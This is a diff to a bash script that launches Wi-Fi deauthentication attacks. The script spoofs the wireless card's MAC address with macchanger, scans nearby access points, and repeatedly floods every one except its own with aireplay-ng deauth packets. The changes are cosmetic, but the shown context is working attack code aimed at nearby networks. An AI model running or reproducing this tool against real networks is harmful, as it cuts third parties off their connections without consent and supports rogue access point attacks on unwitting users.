@@ -65,7 +65,7 @@ version="0.2"
 atk="0"
 MIFACE="mon0"
 ask_to_install="1" # Change to 0 or comment out this line to skip asking for installation
-suggestedAPmac=`arp -a | grep -E -o '[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}'`
+suggestedAPmac=$(arp -a | grep -E -o '[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}')
 
 clear
 
@@ -132,11 +132,11 @@ done
 
 echo -e "\033[32m[+]\033[0m Changing wireless card MAC address..."
 ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up
+echo
 
 scan1="0"
 
 while true; do
-	echo -e "\n\033[33m[!] Press [ CTRL+C ]  in this window to kill attack...\033[0m\n"
 	rmlogs
 	iwlist $WIFACE scan > /tmp/scan.tmp
 	awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
@@ -151,7 +151,7 @@ while true; do
 			aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE &> /dev/null &
 	done
 	atk="1"
-	echo -e "\033[32m[>]\033[0m Sleeping for $waitTime seconds...\n" && sleep $waitTime
+	echo -e "\033[32m[>]\033[0m Sleeping for $waitTime seconds...\n\n\033[33m[!] Press [ CTRL+C ]  in this window to kill attack...\033[0m\n" && sleep $waitTime
 	for active in `jobs -p`; do
 		wait $active
 	done
